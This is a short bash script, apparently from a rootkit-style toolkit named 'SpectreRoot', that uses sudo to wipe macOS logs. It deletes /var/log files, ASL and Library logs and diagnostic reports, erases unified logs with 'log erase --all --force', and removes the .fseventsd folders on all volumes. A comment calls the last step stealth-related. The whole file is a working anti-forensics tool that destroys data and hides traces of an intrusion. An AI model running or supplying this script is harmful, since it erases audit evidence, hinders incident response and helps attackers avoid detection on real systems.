

#!/bin/bash

echo "[SpectreRoot] Cleaning system logs..."

# Delete standard logs
sudo rm -f /var/log/*.log
sudo rm -rf /private/var/log/asl
sudo rm -rf /Library/Logs/*
sudo rm -rf ~/Library/Logs/*

# Clear unified logs (macOS 10.12+)
sudo log erase --all --force

# Remove diagnostic reports
sudo rm -rf /Library/Logs/DiagnosticReports/*
sudo rm -rf ~/Library/Logs/DiagnosticReports/*

# Flush fs events (not strictly logs, but stealth-related)
sudo rm -rf /Volumes/*/.fseventsd

echo "[SpectreRoot] Log cleanup complete."